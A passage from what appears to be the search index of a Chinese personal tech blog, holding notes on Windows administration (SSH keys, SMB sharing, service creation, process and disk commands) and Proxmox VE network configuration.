KVM-WIN10\\DefaultAccount      \u7cfb\u7edf\u7ba1\u7406\u7684\u7528\u6237\u5e10\u6237\u3002                                            TRUE      KVM-WIN10                         TRUE          FALSE    DefaultAccount      TRUE                FALSE            FALSE             S-1-5-21-3936709377-1542623274-3346462912-503   1        Degraded\n512          KVM-WIN10\\Guest               \u4f9b\u6765\u5bbe\u8bbf\u95ee\u8ba1\u7b97\u673a\u6216\u8bbf\u95ee\u57df\u7684\u5185\u7f6e\u5e10\u6237                              TRUE      KVM-WIN10                         TRUE          FALSE    Guest               FALSE               FALSE            FALSE             S-1-5-21-3936709377-1542623274-3346462912-501   1        Degraded\n512          KVM-WIN10\\WDAGUtilityAccount  \u7cfb\u7edf\u4e3a Windows Defender \u5e94\u7528\u7a0b\u5e8f\u9632\u62a4\u65b9\u6848\u7ba1\u7406\u548c\u4f7f\u7528\u7684\u7528\u6237\u5e10\u6237\u3002  TRUE      KVM-WIN10                         TRUE          FALSE    WDAGUtilityAccount  TRUE                TRUE             TRUE              S-1-5-21-3936709377-1542623274-3346462912-504   1        Degraded\n512          KVM-WIN10\\yfy                                                                                 FALSE     KVM-WIN10                         TRUE          FALSE    yfy                 TRUE                FALSE            FALSE             S-1-5-21-3936709377-1542623274-3346462912-1001  1        OK\n</code></pre>","tags":["windows","SMB"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/12/05/2022-12-05-windows%E7%9B%B8%E5%85%B3/#\u5f00\u542f-ssh","title":"\u5f00\u542f ssh","text":"","tags":["windows","SMB"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/12/05/2022-12-05-windows%E7%9B%B8%E5%85%B3/#\u751f\u6210-ssh-key","title":"\u751f\u6210 ssh key","text":"<p>\u590d\u5236\u4e8e tldr \u547d\u4ee4\u8f93\u51fa</p> <pre><code>- Generate an RSA 4096 bit key with email as a comment:\n   ssh-keygen -t rsa -b 4096 -C \"{{email}}\"\n</code></pre>","tags":["windows","SMB"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/12/05/2022-12-05-windows%E7%9B%B8%E5%85%B3/#\u4f7f\u7528-ssh-key-ssh-\u767b\u5f55-windows\u633a\u9ebb\u70e6","title":"\u4f7f\u7528 ssh key ssh \u767b\u5f55 windows(\u633a\u9ebb\u70e6)","text":"<ol> <li> <p>windows \u5f00\u542f ssh server\u3002  \u641c\u7d22\u680f\u8f93\u5165\u7ba1\u7406\u53ef\u9009\u529f\u80fd\uff0c\u641c\u7d22 openssh \u670d\u52a1\u5668\u5b89\u88c5</p> </li> <li> <p>\u7f16\u8f91 C:/ProgramData/ssh/sshd_config</p> <pre><code>\u786e\u4fdd\u4ee5\u4e0b 3 \u6761\u6ca1\u6709\u88ab\u6ce8\u91ca\nPubkeyAuthentication yes\nAuthorizedKeysFile .ssh/authorized_keys\nPasswordAuthentication no\n\n\u786e\u4fdd\u4ee5\u4e0b 2 \u6761\u6709\u6ce8\u91ca\u6389\n#Match Group administrators\n#       AuthorizedKeysFile __PROGRAMDATA__/ssh/administrators_authorized_keys\n</code></pre> </li> <li> <p>\u5ba2\u6237\u7aef\u5c06\u5ba2\u6237\u7aef\u7684 public key \u624b\u52a8\u590d\u5236\u5230\uff08\u4f7f\u7528 ssh-copy-id \u8c8c\u4f3c\u4f1a\u8f93\u51fa\u4e71\u7801\u5931\u8d25\uff09  ~/.ssh/authorized_keys</p> </li> <li>windows \u91cd\u65b0\u542f\u52a8 sshd\uff08\u7ba1\u7406\u5458\uff09  net stop sshd  net start sshd</li> </ol>","tags":["windows","SMB"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/12/05/2022-12-05-windows%E7%9B%B8%E5%85%B3/#\u8fdb\u7a0b\u7ba1\u7406","title":"\u8fdb\u7a0b\u7ba1\u7406","text":"<p>How do you list all processes on the command line in Windows? - Super User</p> <pre><code>tasklist \n</code></pre> <p>\u91cd\u542f\u6709\u9053\u8bcd\u5178</p> <pre><code>taskkill /im YoudaoDict.exe /f \n\nstart /d\"D:\\path\\to\\\" YoudaoDict.exe\n</code></pre>","tags":["windows","SMB"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/12/05/2022-12-05-windows%E7%9B%B8%E5%85%B3/#smb-\u5171\u4eab","title":"SMB \u5171\u4eab","text":"","tags":["windows","SMB"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/12/05/2022-12-05-windows%E7%9B%B8%E5%85%B3/#\u672c\u5730\u7ec4\u7ba1\u7406","title":"\u672c\u5730\u7ec4\u7ba1\u7406","text":"<p>Windows 10/ 11 \u4e0b\u5b89\u5168\u5e76\u6b63\u786e\u5730\u4f7f\u7528 SMB \u5171\u4eab_\u8f6f\u4ef6\u5e94\u7528_\u4ec0\u4e48\u503c\u5f97\u4e70 (smzdm.com)</p> <ul> <li>\u521b\u5efa\u4e00\u4e2a\u4e13\u7528\u7528\u6237\u7528\u4e8e smb \u5171\u4eab</li> </ul>","tags":["windows","SMB"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/12/05/2022-12-05-windows%E7%9B%B8%E5%85%B3/#\u5c06-smb-\u6302\u8f7d\u5230\u76ee\u5f55","title":"\u5c06 smb \u6302\u8f7d\u5230\u76ee\u5f55","text":"<p>windows \u521b\u5efa\u8f6f\u94fe\u63a5  SMB \u8f6f\u94fe\u63a5 \u5bf9\u4e8e\u5927\u90e8\u5206\u5e94\u7528\u6765\u8bf4\uff0c\u8f6f\u94fe\u63a5\u548c\u539f\u751f\u7684\u76ee\u5f55\u884c\u4e3a\u4e00\u6837</p> <pre><code>mklink /d hexo-blog \\\\ryzen\\Home\\Documents\\hexo-blog\\source\\_posts\n</code></pre> <p>\u8fd9\u91cc\u7684\u670d\u52a1\u6307\uff1a\u7a0b\u5e8f\u5f00\u673a\u65f6\u81ea\u52a8\u5728\u540e\u53f0\u8fd0\u884c\u3002\u548c\u5b9a\u65f6\u4efb\u52a1\u5e94\u8be5\u6709\u70b9\u4e0d\u540c\u3002</p>","tags":["windows","SMB"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/12/05/2022-12-05-windows%E7%9B%B8%E5%85%B3/#\u5fae\u8f6f\u8d26\u53f7\u767b\u5f55\u5bfc\u81f4-smb-\u65e0\u6cd5\u8fde\u63a5","title":"\u5fae\u8f6f\u8d26\u53f7\u767b\u5f55\u5bfc\u81f4 SMB \u65e0\u6cd5\u8fde\u63a5","text":"<p>\u5fae\u8f6f\u8d26\u53f7\u767b\u9646\u60c5\u51b5\u4e0b\uff0cSMB \u7528\u6237\u548c\u5bc6\u7801</p> <ul> <li>\u7528\u6237\uff1a\u5fae\u8f6f\u8d26\u53f7\uff08\u90ae\u7bb1\u5730\u5740\uff09</li> <li>\u5bc6\u7801\uff1a\u5fae\u8f6f\u8d26\u53f7\u5bc6\u7801\uff08\u767b\u5f55\u6d4b\u8bd5\uff1aMicrosoft account | Home\uff09</li> </ul> <p>\u4ecd\u7136\u65e0\u6cd5\u767b\u5f55\u539f\u56e0</p> <p>\u8fd9\u4e2a\u95ee\u9898\u901a\u5e38\u662f\u7531\u4e8e\u8ddf\u7740\u5b89\u88c5\u5f15\u5bfc\u76f4\u63a5\u767b\u5f55\u5fae\u8f6f\u8d26\u6237\u2192\u8bbe\u7f6e PIN\u00a0\u5bfc\u81f4\u7684\uff0c\u56e0\u4e3a\u4ece\u6765\u6ca1\u6709\u4f7f\u7528\u8fc7\u5fae\u8f6f\u8d26\u6237\u7684\u5bc6\u7801\u9a8c\u8bc1\u767b\u9646\u8fc7\uff0c\u4e5f\u5c31\u5bfc\u81f4\u672c\u5730\u6ca1\u6709\u4fdd\u5b58\u6b63\u786e\u7684\u5bc6\u7801\uff0c\u5373\u4f7f\u8f93\u5165\u6b63\u786e\u5bc6\u7801\u4e5f\u65e0\u6cd5\u9a8c\u8bc1 Windows10/11 SMB\u5171\u4eab\u6587\u4ef6\u5939\u5bc6\u7801\u6b63\u786e\u4f46\u4e00\u76f4\u9519\u8bef\u7684\u89e3\u51b3\u529e\u6cd5 | Patrick's Blog</p> <p>\u89e3\u51b3\u529e\u6cd5</p> <p>Windows \u8bbe\u7f6e\u2192\u8d26\u6237\u2192\u767b\u9646\u9009\u9879\uff0c\u7981\u7528\u8981\u6c42 Microsoft \u8d26\u6237\u4f7f\u7528 Windows Hello \u767b\u5f55\uff0c\u7136\u540e\u9501\u5c4f\u4f7f\u7528\u5bc6\u7801\u767b\u5f55\u4e00\u6b21\uff08\u4e0d\u4f7f\u7528 pin\uff09</p> <p>\u5982\u679c\u8fd8\u662f\u4e0d\u884c\uff0c\u5c1d\u8bd5\u91cd\u542f\u4e00\u4e0b\u7535\u8111\u3002\u6211\u662f\u521b\u5efa\u4e86\u4e00\u4e2a\u672c\u5730\u7528\u6237\u767b\u5f55\u4e86\u4e00\u6b21\uff0c\u7136\u540e\u7a81\u7136\u5c31\u597d\u4e86\u3002</p>","tags":["windows","SMB"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/12/05/2022-12-05-windows%E7%9B%B8%E5%85%B3/#windows-\u5b9a\u65f6\u4efb\u52a1","title":"windows \u5b9a\u65f6\u4efb\u52a1","text":"","tags":["windows","SMB"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/12/05/2022-12-05-windows%E7%9B%B8%E5%85%B3/#sc-\u547d\u4ee4","title":"sc \u547d\u4ee4","text":"<p>SC \u662f\u7528\u6765\u4e0e\u670d\u52a1\u63a7\u5236\u7ba1\u7406\u5668\u548c\u670d\u52a1\u8fdb\u884c\u901a\u4fe1\u7684\u547d\u4ee4\u884c\u7a0b\u5e8f</p> <pre><code>C:\\Users\\yfy&gt;sc create\n\u63cf\u8ff0:\n        \u5728\u6ce8\u518c\u8868\u548c\u670d\u52a1\u6570\u636e\u5e93\u4e2d\u521b\u5efa\u670d\u52a1\u9879\u3002\n\u7528\u6cd5:\n        sc &lt;server&gt; create [service name] [binPath= ] &lt;option1&gt; &lt;option2&gt;...\n\n\u9009\u9879:\n\u6ce8\u610f: \u9009\u9879\u540d\u79f0\u5305\u62ec\u7b49\u53f7\u3002\n      \u7b49\u53f7\u548c\u503c\u4e4b\u95f4\u9700\u8981\u4e00\u4e2a\u7a7a\u683c\u3002\n type= &lt;own|share|interact|kernel|filesys|rec|userown|usershare&gt;\n       (\u9ed8\u8ba4 = own)\n start= &lt;boot|system|auto|demand|disabled|delayed-auto&gt;\n       (\u9ed8\u8ba4 = demand)\n error= &lt;normal|severe|critical|ignore&gt;\n       (\u9ed8\u8ba4 = normal)\n binPath= &lt;.exe \u6587\u4ef6\u7684 BinaryPathName&gt;\n group= &lt;LoadOrderGroup&gt;\n tag= &lt;yes|no&gt;\n depend= &lt;\u4f9d\u5b58\u5173\u7cfb(\u4ee5 / (\u659c\u6760)\u5206\u9694)&gt;\n obj= &lt;AccountName|ObjectName&gt;\n       (\u9ed8\u8ba4= LocalSystem)\n DisplayName= &lt;\u663e\u793a\u540d\u79f0&gt;\n password= &lt;\u5bc6\u7801&gt;\n</code></pre> <p>\u4e0d\u77e5\u9053\u600e\u4e48\u6dfb\u52a0\u547d\u4ee4\u884c\u53c2\u6570</p> <p>\u8c8c\u4f3c binPath \u53ef\u4ee5\u5305\u542b\u53c2\u6570\uff0c\u6ca1\u8bd5\u8fc7</p> <pre><code>sc create redis binpath= \"\"C:\\Software\\server\\Redis\\redis-server.exe\" --service-run \"rdis.windows-service.conf\"\" start= auto\n\n\u4f5c\u8005\uff1aLAMYMAY\n\u94fe\u63a5\uff1ahttps://www.jianshu.com/p/73d8dd70f918\n\u6765\u6e90\uff1a\u7b80\u4e66\n\u8457\u4f5c\u6743\u5f52\u4f5c\u8005\u6240\u6709\u3002\u5546\u4e1a\u8f6c\u8f7d\u8bf7\u8054\u7cfb\u4f5c\u8005\u83b7\u5f97\u6388\u6743\uff0c\u975e\u5546\u4e1a\u8f6c\u8f7d\u8bf7\u6ce8\u660e\u51fa\u5904\u3002\n</code></pre>","tags":["windows","SMB"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/12/05/2022-12-05-windows%E7%9B%B8%E5%85%B3/#\u5c0f\u5de5\u5177-nssm","title":"\u5c0f\u5de5\u5177 nssm","text":"<p>NSSM - the Non-Sucking Service Manager</p> <p>nssm install \u663e\u793a\u6dfb\u52a0\u670d\u52a1\u7684 GUI \u754c\u9762</p> <p></p>","tags":["windows","SMB"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/12/05/2022-12-05-windows%E7%9B%B8%E5%85%B3/#windows-\u5c0f\u95ee\u9898","title":"windows \u5c0f\u95ee\u9898","text":"","tags":["windows","SMB"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/12/05/2022-12-05-windows%E7%9B%B8%E5%85%B3/#\u4e2d\u6587\u8f93\u5165\u6cd5\u5019\u9009\u6846\u6d88\u5931","title":"\u4e2d\u6587\u8f93\u5165\u6cd5\u5019\u9009\u6846\u6d88\u5931","text":"<p>\u5b9e\u9645\u95ee\u9898\u5c45\u7136\u662f\u6587\u4ef6\u7ba1\u7406\u5668\u3002\u4efb\u52a1\u7ba1\u7406\u5668\u4e2d\u91cd\u542f Windows \u8d44\u6e90\u7ba1\u7406\u5668\u5373\u53ef\u3002</p>","tags":["windows","SMB"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/12/05/2022-12-05-windows%E7%9B%B8%E5%85%B3/#\u7f51\u7edc\u663e\u793a\u672a\u8fde\u63a5\u5b9e\u9645\u6709\u7f51","title":"\u7f51\u7edc\u663e\u793a\u672a\u8fde\u63a5\u5b9e\u9645\u6709\u7f51","text":"<p>\u6d4b\u8bd5\u4ee5\u4e0b\u4e24\u4e2a\u57df\u540d dns \u89e3\u6790\u662f\u5426\u6b63\u5e38</p> <pre><code>dns.msftncsi.com\nwww.msftconnecttest.com\n</code></pre>","tags":["windows","SMB"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/12/05/2022-12-05-windows%E7%9B%B8%E5%85%B3/#\u5220\u9664\u6587\u4ef6\u7ba1\u7406\u5668\u4e2d\u7684\u7f51\u76d8","title":"\u5220\u9664\u6587\u4ef6\u7ba1\u7406\u5668\u4e2d\u7684\u7f51\u76d8","text":"<p>new bing Q: \u5982\u4f55\u6e05\u9664\u8f6f\u4ef6\u5728 windows \u6587\u4ef6\u7ba1\u7406\u5668\u4e2d\u6ce8\u518c\u7684\u7f51\u76d8 A: \u5982\u679c\u60a8\u60f3\u5220\u9664\u6ce8\u518c\u8868\u4e2d\u7684\u7f51\u76d8\uff0c\u8bf7\u6309\u7167\u4ee5\u4e0b\u6b65\u9aa4\u64cd\u4f5c\uff1a</p> <ol> <li>\u6309\u4e0b Win+R \u952e\u6253\u5f00\u8fd0\u884c\u7a97\u53e3\u3002</li> <li>\u8f93\u5165 regedit \u5e76\u6309\u56de\u8f66\u952e\u6253\u5f00\u6ce8\u518c\u8868\u7f16\u8f91\u5668\u3002</li> <li>\u5728\u5de6\u4fa7\u5bfc\u822a\u680f\u4e2d\u627e\u5230 HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\NetDrive\u3002</li> <li>\u53f3\u952e\u5355\u51fb NetDrive \u5e76\u9009\u62e9\u5220\u9664\u3002</li> <li>\u5173\u95ed\u6ce8\u518c\u8868\u7f16\u8f91\u5668\u3002</li> </ol> <p>\u4f46\u662f\u8fd9\u91cc\u7684\u8def\u5f84\u4e0d\u5b8c\u5168\u6b63\u786e</p> <p>\u8c37\u6b4c\uff1a\u5220\u9664\u6ce8\u518c\u8868\u4e2d\u7684\u7f51\u76d8 \u5f97\u5230\u8bb8\u591a\u7c7b\u4f3c\u95ee\u9898</p> <p>\u5728 regedit \u4e2d\u624b\u52a8\u641c\u7d22 SeaDrive\uff0c\u53ef\u4ee5\u627e\u5230\u4f4d\u7f6e\uff0c\u5220\u9664\u95ee\u9898\u89e3\u51b3\u3002</p>","tags":["windows","SMB"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/12/05/2022-12-05-windows%E7%9B%B8%E5%85%B3/#\u6587\u4ef6\u6216\u76ee\u5f55\u635f\u574f\u4e14\u65e0\u6cd5\u8bfb\u53d6","title":"\u6587\u4ef6\u6216\u76ee\u5f55\u635f\u574f\u4e14\u65e0\u6cd5\u8bfb\u53d6","text":"<p>qbittorent \u79fb\u52a8\u79cd\u5b50\u65f6\uff0c\u6211\u628a\u8fdb\u7a0b\u5f3a\u884c\u6740\u6389\u4e86\u3002\u5bfc\u81f4\u78c1\u76d8\u4e0a\u51fa\u73b0\u4e86\u6587\u4ef6\u5939\u65e0\u6cd5\u5220\u9664\u7684\u60c5\u51b5</p> <p>\u89e3\u51b3\u529e\u6cd5\uff0c\u626b\u63cf\u4fee\u590d\u6587\u4ef6\u7cfb\u7edf</p> <pre><code>chkdsk /f C:\n</code></pre>","tags":["windows","SMB"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/12/05/2022-12-05-windows%E7%9B%B8%E5%85%B3/#\u5173\u95ed\u5386\u53f2\u8bb0\u5f55","title":"\u5173\u95ed\u5386\u53f2\u8bb0\u5f55","text":"","tags":["windows","SMB"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/12/05/2022-12-05-windows%E7%9B%B8%E5%85%B3/#edge-hsts","title":"edge HSTS","text":"<p>HSTS \u662f\u4e00\u79cd\u5b89\u5168\u673a\u5236\uff0c\u5f3a\u5236\u6d4f\u89c8\u5668\u4f7f\u7528 https \u8fde\u63a5 <pre><code>edge://net-internals/#hsts\n</code></pre></p> <p>Input a domain name to delete its dynamic HSTS policy. (You cannot delete preloaded entries.):</p>","tags":["windows","SMB"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/","title":"PVE","text":"<p>PVE \u7528\u6cd5\u3001\u914d\u7f6e\u4e2a\u4eba\u8bb0\u5f55</p>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#\u5b89\u88c5","title":"\u5b89\u88c5","text":"<p>\u5b89\u88c5\u6ce8\u610f\u4e8b\u9879</p> <ul> <li>\u4e4b\u540e\u4fee\u6539 hostname \u5f88\u9ebb\u70e6\uff0c\u56e0\u6b64\u4e00\u5f00\u59cb\u5c31\u786e\u5b9a\u597d</li> <li>zfs \u662f\u6211\u6bd4\u8f83\u63a8\u8350\u7684\u7cfb\u7edf\u76d8\u683c\u5f0f\uff0c\u540e\u9762\u521b\u5efa\u865a\u62df\u673a\uff0clxc \u5bb9\u5668\uff0c\u78c1\u76d8\u955c\u50cf\u90fd\u4f1a\u76f4\u63a5\u4f7f\u7528 zfs \u7684 zvol \u529f\u80fd\uff0c\u56e0\u6b64\u53ef\u4ee5\u4f7f\u7528 zfs \u81ea\u5df1\u7ba1\u7406\u8fd9\u4e9b\u78c1\u76d8\u955c\u50cf\uff0c\u975e\u5e38\u65b9\u4fbf\u3002</li> </ul> <p>\u6362\u6e90\uff1aProxmox \u6e90\u4f7f\u7528\u5e2e\u52a9 \u2014 USTC Mirror Help \u6587\u6863</p> <p>\u5e38\u7528\u547d\u4ee4\u5de5\u5177\uff1aCommand Line Tools - Proxmox VE</p>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#_1","title":"PVE","text":"","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#pve-\u914d\u7f6e","title":"PVE \u914d\u7f6e","text":"","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#\u7f51\u7edc\u914d\u7f6e","title":"\u7f51\u7edc\u914d\u7f6e","text":"<p>PVE\u4f7f\u7528ifupdown2\u8fdb\u884c\u7f51\u7edc\u8bbe\u7f6e\uff0c\u914d\u7f6e\u6587\u4ef6\u4f4d\u4e8e<code>/etc/network/interfaces</code></p> <ul> <li>\u4fee\u6539\u914d\u7f6e\u6587\u4ef6\u540e\uff0c\u5e94\u7528\u66f4\u6539\uff1a<code>ifreload -a</code> \u4f7f\u7528GUI\u8bbe\u7f6e\uff0capply\u540e\u81ea\u52a8\u5e94\u7528\u66f4\u6539</li> </ul> <pre><code>/etc/network/interfaces\n\nifreload -a  # \u5e94\u7528\u66f4\u6539\n</code></pre>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#interfaces\u914d\u7f6e\u6587\u4ef6","title":"interfaces\u914d\u7f6e\u6587\u4ef6","text":"<p>man interfaces(5)</p> <ul> <li>auto<ul> <li>\"auto\" are used to identify the physical interfaces to be brought up when ifup is run with the -a option.</li> <li>\"allow-\" are used to identify interfaces that should be brought up automatically by various subsystems. This may be done using a command such as \"ifup --allow=hotplug  eth0 eth1\", which will only bring up eth0 or eth1 if it is listed in an \"allow-hotplug\" line</li> </ul> </li> <li>iface<ul> <li>iface is normally given a interface name as its first non-option argument</li> </ul> </li> <li>inet/inet6 + method<ul> <li>\u9ed8\u8ba4\uff1ainet/inet6\u00a0and\u00a0static</li> </ul> </li> </ul> <pre><code>inet or inet6\nloopback   //This method may be used to define the loopback interface\n static    //define ethernet interfaces with statically allocated addresses\n dhcp      //This method may be used to obtain an address via DHCP\n\ninet6\n auto    //This method may be used to obtain an address via SLAAC.\n</code></pre> <ul> <li>Additional interface options/attributes can be given on subsequent lines in the iface stanza</li> </ul>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#\u5e38\u89c1\u7f51\u7edc\u6a21\u5f0f","title":"\u5e38\u89c1\u7f51\u7edc\u6a21\u5f0f","text":"","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#bridge","title":"bridge","text":"<ul> <li>pve\u4f5c\u4e3a\u4e00\u4e2a\u4ea4\u6362\u673a\uff0cpve host\u548cVMs \u548c\u5916\u90e8 \u7269\u7406\u7f51\u7edc\u4f4d\u4e8e\u4e00\u4e2aLAN</li> </ul> <p>The\u00a0Bridged\u00a0model makes the most sense in this case, and this is also the default mode on new Proxmox VE installations. Each of your Guest system will have a virtual interface attached to the Proxmox VE bridge. This is similar in effect to having the Guest network card directly connected to a new switch on your LAN, the Proxmox VE host playing the role of the switch.</p>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#routed","title":"routed","text":"<ul> <li>\u8fd0\u884c\u5546\u53ef\u80fd\u4e0d\u5141\u8bb8\u540c\u4e00\u4e2a\u7269\u7406\u63a5\u53e3\u6709\u591a\u4e2aMAC\u4e0a\u7f51\u3002 Most hosting providers do not support the above setup. For security reasons, they disable networking as soon as they detect multiple MAC addresses on a single interface.</li> </ul>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#masqueue","title":"masqueue","text":"<ul> <li>VM\u901a\u8fc7PVE\u4e0a\u7f51</li> </ul>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#ipv6\u76f8\u5173","title":"ipv6\u76f8\u5173","text":"","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#ipv6\u65e0\u6cd5\u83b7\u5f97\u5730\u5740","title":"ipv6\u65e0\u6cd5\u83b7\u5f97\u5730\u5740","text":"<p>IPv6 Slaac not working \u00b7 Issue #178 \u00b7 CumulusNetworks/ifupdown2 (github.com) \u6dfb\u52a0pre-up\u884c\u624d\u80fd\u591f\u83b7\u5f97ipv6\u5730\u5740</p> <pre><code>auto vmbr0\niface vmbr0 inet dhcp\n        bridge-ports enp2s0\n        bridge-stp off\n        bridge-fd 0\n        pre-up echo 2 &gt; /proc/sys/net/ipv6/conf/$IFACE/accept_ra\n</code></pre> <p>\u521a\u5f00\u59cbpve iface enp2s0 inet dhcp\u65e0\u6cd5\u83b7\u5f97ipv4\u5730\u5740\u3002\u5f00\u542fbridge-stp on\u5c31\u53ef\u4ee5\u4e86 \u53d1\u73b0\u8fd8\u662f\u4e0d\u884c\uff0c\u9700\u8981\u5c06bridge-fd\u4ece0\u6539\u4e3a\u66f4\u5927\u7684\u503c\uff08\u6bd4\u598215\uff09\uff0c\u624d\u53ef\u4ee5 vmbr0: the has_elasticity option has been deprecated and is always 16</p>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#\u7981\u7528-vmbr0-ipv6","title":"\u7981\u7528 vmbr0 ipv6","text":"<p>vmbr0 \u7528\u4e8e\u8f6f\u8def\u7531\u7684 wan \u53e3\uff0cpve host \u81ea\u8eab\u5e76\u4e0d\u60f3\u76f4\u63a5\u66b4\u9732\u5728\u516c\u7f51\u3002\u7136\u800c pve \u5374\u603b\u662f\u7ed9 vmbr0 \u8bbe\u7f6e ipv6 \u5730\u5740\uff0c\u5373\u4f7f vmbr0 \u914d\u7f6e\u5982\u4e0b\uff0c\u4ecd\u7136\u7981\u7528\u4e0d\u6389 ipv6\u3002</p> <pre><code># /etc/network/interfaces\nauto vmbr0\niface vmbr0 inet6 manual\niface vmbr0 inet manual\n        bridge-ports enp2s0\n        bridge-stp off\n        bridge-fd 0\n</code></pre> <p>\u89e3\u51b3\u529e\u6cd5\u4e3a\u8bbe\u7f6e sysctl.conf</p> <pre><code># /etc/sysctl.d/1-vmbr0-v6.conf\nnet.ipv6.conf.vmbr0.disable_ipv6=1\n\nsysctl -p /etc/sysctl.d/1-vmbr0-v6.conf\n</code></pre> <p>\u4e5f\u53ef\u4ee5\u4e0d\u5b8c\u5168\u7981\u7528 v6\uff0c\u4fdd\u7559 fe80 \u5730\u5740</p> <pre><code>net.ipv6.conf.vmbr0.disable_ipv6=0\nnet.ipv6.conf.vmbr0.autoconf=0\n\nnet.ipv6.conf.all.autoconf=0  # \u597d\u50cf\u4e5f\u9700\u8981\u628aall\u5173\u4e86\uff0c\u5426\u5219\u4f1a\u88ab\u8986\u76d6\n</code></pre> <p>\u68c0\u67e5\u662f\u5426\u751f\u6548</p> <pre><code>cat /proc/sys/net/ipv6/conf/vmbr0/autoconf\n</code></pre> <p>\u53c2\u8003</p> <ul> <li>IPv6 \u2014 The Linux Kernel documentation</li> </ul>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#\u624b\u52a8\u6dfb\u52a0\u8def\u7531","title":"\u624b\u52a8\u6dfb\u52a0\u8def\u7531","text":"<p>\u521b\u5efa\u4e24\u4e2a br\uff0c\u5c45\u7136\u4e0d\u652f\u6301\u8bbe\u7f6e\u4e24\u4e2a default route\u3002\u89e3\u51b3\u529e\u6cd5\u662f\u5728 interface \u914d\u7f6e\u6587\u4ef6\u4e2d\u901a\u8fc7 post-up \u81ea\u5df1\u6dfb\u52a0</p> <pre><code>auto vmbr0\niface vmbr0 inet static\n        address 210.45.76.204/24\n        bridge-ports enp7s0\n        bridge-stp off\n        bridge-fd 0\n        post-up ip ru add from 210.45.76.204 lookup vmbr0 prior 3\n        post-up ip ro add table vmbr0 default via 210.45.76.254 dev vmbr0\n        post-up ip ro add default via 210.45.76.254 dev vmbr0 metric 200\n\nauto vmbr1\niface vmbr1 inet static\n        address 192.168.35.254/24\n        bridge-ports enxf8e43b0a274a\n        bridge-stp off\n        bridge-fd 0\n        post-up ip ro add default via 192.168.35.1 dev vmbr1 metric 100\n        pre-down ip ro del default dev vmbr1\n</code></pre>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#\u7f51\u7edc\u914d\u7f6e-vlannew","title":"\u7f51\u7edc\u914d\u7f6e-vlan\uff08new\uff09","text":"","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#pve-\u51e0\u79cd-vlan-\u914d\u7f6e\u65b9\u5f0f","title":"pve \u51e0\u79cd vlan \u914d\u7f6e\u65b9\u5f0f","text":"<p>Host System Administration (proxmox.com)</p> <ul> <li>vlan awarensess on linux bridge<ul> <li>\u521b\u5efa VM \u7f51\u5361\u65f6\u6307\u5b9a 